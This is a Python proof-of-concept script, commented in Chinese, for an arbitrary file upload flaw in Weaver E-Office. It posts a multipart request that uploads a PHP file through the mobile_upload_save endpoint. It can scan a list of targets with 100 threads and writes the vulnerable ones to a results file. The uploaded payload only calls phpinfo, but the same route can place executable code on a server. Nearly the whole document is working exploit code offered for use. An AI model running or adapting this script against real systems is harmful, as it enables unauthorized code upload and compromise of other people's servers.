# 泛微 E-Office文件上传漏洞

import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    # banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="泛微 E-Office文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
    url = target+payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"
    }
    data = '------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\nContent-Disposition: form-data; name=\"upload_quwan\"; filename=\"1.php.\"\r\nContent-Type: image/jpeg\r\n \r\n<?php phpinfo();?>\r\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n \r\n \r\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        response = requests.post(url=url, headers=headers, data=data, proxies=proxies, verify=False,timeout=10)
        if response.status_code == 200 and '1.php' in response.text:
            print(f"[+]该网址存在任意文件上传漏洞{target} \n")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[-]该网址不存在任意文件上传漏洞{target}")
            return False
    except requests.RequestException as e:
        print(f"[*]该网址存在问题，请手动检测{target}")

if __name__ =='__main__':
    main()